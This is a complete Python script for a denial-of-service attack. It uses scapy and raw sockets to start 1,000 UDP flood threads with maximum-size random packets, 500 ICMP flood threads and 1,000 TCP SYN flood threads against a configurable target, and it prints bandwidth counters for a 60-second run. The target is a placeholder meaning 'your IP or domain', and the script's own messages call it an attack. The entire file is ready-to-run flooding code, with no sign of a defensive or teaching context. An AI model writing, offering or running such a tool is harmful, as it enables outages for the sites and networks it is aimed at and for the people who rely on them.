import socket
import random
import threading
import time
import os
from scapy.all import IP, ICMP, TCP, send

TARGET_IP = "ip-hoac-ten-mien-cua-ban.com"
TARGET_UDP_PORT = 27015
TARGET_TCP_PORT = 80
PACKET_SIZE = 65507
THREADS_UDP = 1000
THREADS_ICMP = 500
THREADS_TCP = 1000
DURATION = 60

total_bytes_sent = 0
total_bytes_received = 0
lock = threading.Lock()

def update_bandwidth(sent, received):
    global total_bytes_sent, total_bytes_received
    with lock:
        total_bytes_sent += sent
        total_bytes_received += received

def udp_flood():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        packet = os.urandom(PACKET_SIZE)
        while True:
            try:
                sent = s.sendto(packet, (TARGET_IP, TARGET_UDP_PORT))
                update_bandwidth(sent, 0)
            except Exception as e:
                print(f"UDP Error: {e}")

def icmp_flood():
    packet = IP(dst=TARGET_IP)/ICMP()/"FloodTest"
    while True:
        try:
            send(packet, verbose=0)
            update_bandwidth(len(packet), 0)
        except Exception as e:
            print(f"ICMP Error: {e}")

def tcp_flood():
    while True:
        try:
            ip = IP(dst=TARGET_IP)
            syn = TCP(dport=TARGET_TCP_PORT, flags="S", seq=random.randint(1, 65535))
            send(ip/syn, verbose=0)
            update_bandwidth(len(ip/syn), 0)
        except Exception as e:
            print(f"TCP Error: {e}")

def display_bandwidth():
    global total_bytes_sent, total_bytes_received
    while True:
        with lock:
            sent_mb = total_bytes_sent / (1024 * 1024)
            received_mb = total_bytes_received / (1024 * 1024)
        print(f"Total Sent: {sent_mb:.2f} MB | Total Received: {received_mb:.2f} MB")
        time.sleep(1)

def perform_attack():
    print(f"Starting combined UDP, ICMP, and TCP flood on {TARGET_IP}...")
    threads = []

    for _ in range(THREADS_UDP):
        thread = threading.Thread(target=udp_flood)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    for _ in range(THREADS_ICMP):
        thread = threading.Thread(target=icmp_flood)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    for _ in range(THREADS_TCP):
        thread = threading.Thread(target=tcp_flood)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    display_thread = threading.Thread(target=display_bandwidth)
    display_thread.daemon = True
    display_thread.start()

    try:
        for remaining in range(DURATION, 0, -1):
            print(f"Flooding... {remaining} seconds remaining")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")

    print("\nAttack finished.")
    with lock:
        sent_mb = total_bytes_sent / (1024 * 1024)
        received_mb = total_bytes_received / (1024 * 1024)
    print(f"Total Sent: {sent_mb:.2f} MB")
    print(f"Total Received: {received_mb:.2f} MB")

if __name__ == "__main__":
    perform_attack()
